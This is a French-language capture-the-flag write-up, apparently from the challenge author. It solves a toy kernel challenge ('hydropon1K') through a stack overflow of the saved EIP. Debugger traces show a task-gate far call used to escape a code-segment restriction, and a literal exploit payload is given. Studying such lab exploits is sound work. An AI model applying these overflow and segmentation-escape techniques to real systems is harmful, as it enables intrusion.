@@ -1,0 +1,104 @@
+Solution:
+------------
+
+Déjà on peut réperez le nombre d'octet necessaire à la réécriture de la sauvegarde d'eip :
+
+(0) [0x00400a2c] 001b:000000000000002c (unk. ctxt): mov eax, 0x00001337       ; b837130000
+<bochs:4> s
+Next at t=15946980
+(0) [0x00400a31] 001b:0000000000000031 (unk. ctxt): mov ebx, edx              ; 89d3
+<bochs:5> s
+Next at t=15946981
+(0) [0x00400a33] 001b:0000000000000033 (unk. ctxt): int 0x89                  ; cd89
+<bochs:6> r
+rax: 0x00000000:00001337 rcx: 0x00000000:0000003e
+rdx: 0x00000000:000009d3 rbx: 0x00000000:000009d3
+rsp: 0x00000000:000009d3 rbp: 0x00000000:000009eb
+rsi: 0x00000000:000e7ca2 rdi: 0x00000000:0000ffac
+r8 : 0x00000000:00000000 r9 : 0x00000000:00000000
+r10: 0x00000000:00000000 r11: 0x00000000:00000000
+r12: 0x00000000:00000000 r13: 0x00000000:00000000
+r14: 0x00000000:00000000 r15: 0x00000000:00000000
+rip: 0x00000000:00000033
+eflags 0x00000202
+id vip vif ac vm rf nt IOPL=0 of df IF tf sf zf af pf cf
+<bochs:7> x/1x ds:ebp+4
+[bochs]:
+0x00000000400009ef <bogus+       0>:    0x0000001b
+
+Nous avons donc notre buffer en 0x400009d3 et le saved-eip en 0x400009ef soit 0x1C ; [0x1c octet][BBBB]
+
+Premier test, pour vérifier nos calculs :
+
+<bochs:1> c
+(0) Magic breakpoint
+Next at t=261026930
+(0) [0x00400a3c] 001b:000000000000003c (unk. ctxt): leave                     ; c9
+<bochs:2> s
+Next at t=261026931
+(0) [0x00400a3d] 001b:000000000000003d (unk. ctxt): ret                       ; c3
+<bochs:3> x/1x ds:esp
+[bochs]:
+0x00000000400009ef <bogus+       0>:    0x42424242
+
+Et bien sur, nous nous prenons une #GP car nous sortons des limites du segment de code.
+
+Maintenant, la seconde étape est de remarqué que dans l'environnement où nous nous trouvons est restreint ; j'entends par là
+que j'ai fais mon possible pour éviter tout retour possible dans la stack en cloisonnant eip dans une section strictement
+reservé au code.
+Pour pouvoir évader cette protection il faut avoir remarquer plusieurs choses ; tout d'abord présence de segment qui peuvent
+être intéréssant :
+
+<bochs:5> info gdt
+Global Descriptor Table (base=0x0000000000007ca9, limit=72):
+GDT[0x00]=??? descriptor hi=0x00000000, lo=0x00000000
+GDT[0x01]=Code segment, laddr=00001000, limit=0a000 bytes, Execute/Read, 32-bit
+GDT[0x02]=Data segment, laddr=00000000, limit=fffff * 4Kbytes, Read/Write, Accessed
+GDT[0x03]=Code segment, laddr=40000a00, limit=00400 * 4Kbytes, Execute/Read, 32-bit
+GDT[0x04]=Data segment, laddr=40000000, limit=009ff bytes, Read/Write, Accessed
+GDT[0x05]=32-Bit TSS (Busy) at 0x00000900, length 0x00067
+GDT[0x06]=32-Bit TSS (Available) at 0x00000800, length 0x00067
+GDT[0x07]=Task Gate target=0x0033:0x00000000, DPL=3               <-- W00TZ
+GDT[0x08]=Code segment, laddr=00000000, limit=fffff * 4Kbytes, Execute/Read, 32-bit
+
+On remarque qu'un task-gate descriptor est présent, celui-ci nous permet lors d'un call far/jmp far de faire un changement de
+tache en une instruction. Le task-gate se base sur l'utilisation d'une structure TSS et d'un TSS descriptor contenu dans la gdt.
+Le selector étant 0x33, l'entrée qui nous interesse se situe bien dans la gdt à l'indice 0x6. C'est cette TSS qui a été mise en
+place pour mettre le changement de tâche afin de pouvoir appeler la fonction magique.
+
+[code]
+	pTss2->ss0  = SEGDONNEER0;
+	pTss2->esp0 = 0x8F00;
+	pTss2->cs   = SEGCODE2R3;
+	pTss2->esp  = 0x9FF;
+	pTss2->ss   = SEGDONNEER3;
+	pTss2->cr3  = (unsigned int)0x20000;	
+	pTss2->eip  = (unsigned int) 0x50000000;
+[/code]
+
+Nous voyons bien que le code-segment-selector est un segment de code flat model ; grâce à lui nous pourrons appeler la fonction au
+travers du changement de tâche réaliser par le call far sur le task-gate segment selector.
+Résumons, nous contrôlons eip, mais nous sommes coincé dans un segment de code ; il nous faudrait tout simplement un call far sur
+le segment descriptor afin de provoquer un retour sur la fonction magique ; et bien il suffit de chercher dans le segment de code :
+
+<bochs:9> u /1 0x40313233
+40313233: (                    ): call far 003b:00000000    ; 9a000000003b00
+
+Opla, le voici nous y sommes presque.
+Il ne faut pas oublier que la base du segment de code est 0x40000A00 et que l'adresse où l'on veut ret est 0x40313233 ; donc il nous
+faut calculer l'offset entres cette adresse et la base du segment de code soit : 0x40313233-0x40000A00 = 0x312833 les entier étant 
+codé en mémoire en little-endian on obtiens : 0x332831 donc [aa..][0x332831]
+Mais bien evidemennt, j'ai placer le far call à une adresse bien précise pour pouvoir réaliser l'évasion, si vous vous munissez
+d'une table ascii vous remarquerez que 0x332831=>"3(1".
+Nous avons donc notre payload :
+[AAAAAAAAAAAAAAAAAAAAAAAAAAAA][3(1] et zboom c finit =).
+
+
+Je suis cependant d'accord avec vous, le challenge manque cruellement de "réalité" en effet, hydropon1K est bien trop light pour
+permettre la mise en place de quelque chose de plus réel et de plus amusant..cependant il est intéréssant de voir qu'il existe
+plusieurs façons de mettre en péril la segmentation (quelques fois).
+En espérant que ça vous aura pas (trop) pris le choux, et que vous aurez appris quelque chose :).
+Cordialement, 0vercl0k.
+
+
+lilxam lui avait pense a reecrire des morceaux de la region de code, en ring0 le ds/ss segment est flat, on peut donc ecrire partout, aucne limite est fixe
